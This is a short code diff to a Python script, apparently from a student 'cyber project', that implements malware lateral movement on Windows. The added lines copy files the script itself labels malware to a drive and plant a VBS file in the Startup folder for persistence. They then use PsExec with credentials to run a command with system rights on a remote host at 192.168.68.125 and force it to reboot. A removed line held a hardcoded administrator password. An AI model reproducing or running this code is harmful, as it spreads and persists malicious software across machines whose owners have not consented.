@@ -19,13 +19,16 @@ if __name__ == '__main__':
     except:
         print("didn't initiate connection")
     try:
-        x = os.popen(r"xcopy " + path + r"\*.* h:\SilentButDeadly(CyberProject)\LateralMovement  /E /H /C /I").read()
+        print(str(os.popen(
+            r"xcopy " + path + r"\*.* h:\SilentButDeadly(CyberProject)\LateralMovement  /E /H /C /I").read()))
         print("COPIED MALWARE")
+        print(str(os.popen(r'copy start.vbs "h:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"')))
+        print('COPIED STARTUP')
     except:
         print("didn't copy malware")
     try:
-        os.popen(
-            r'Psexec \\192.168.68.125 -u administrator -p 123456 -i h:\SilentButDeadly(CyberProject)\LateralMovement\main.py').read()
+        print(str(os.popen(
+            r'Psexec \\192.168.68.125 -u ' + user + ' -p ' + password + ' -w c:\SilentButDeadly(CyberProject)\LateralMovement -s -i shutdown /r').read()))
         print('DONE')
     except:
         print('failed to run')
